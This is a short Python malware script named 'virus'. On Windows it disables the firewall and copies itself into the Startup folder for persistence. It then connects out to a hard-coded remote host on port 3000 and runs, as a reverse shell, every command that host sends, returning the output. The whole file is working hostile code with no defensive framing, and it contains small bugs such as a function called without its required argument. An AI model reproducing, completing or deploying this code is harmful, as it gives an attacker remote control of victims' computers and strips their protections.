import socket, time, os, platform

APPNAME = "virus"

def disableFirewall():
    c = wmi.WMI(namespace="root/Microsoft/HomeNet")
    for obj in c.HNet_ConnectionProperties():
        obj.IsFirewalled = False

def windowsPersistent(s):
    username = os.popen("echo %username%").read()
    pwd = os.popen("echo %cd%").read()
    src = os.path.join(pwd,APPNAME)
    dst = "C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup".format(username)
    command = "copy {} {}".format(src,dst)
    print(command)
    os.system(command)


if platform.system() == 'Windows' :
    import wmi
    disableFirewall()
    windowsPersistent()

ip, port = "laraki.freeboxos.fr", 3000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip,port))
s.send(b'Connected\n')



while True:
    data = s.recv(1024).decode()
    try : 
        output = os.popen(data).read()
        s.send(output.encode())
    except:
        print("\tcouldn't execute it")




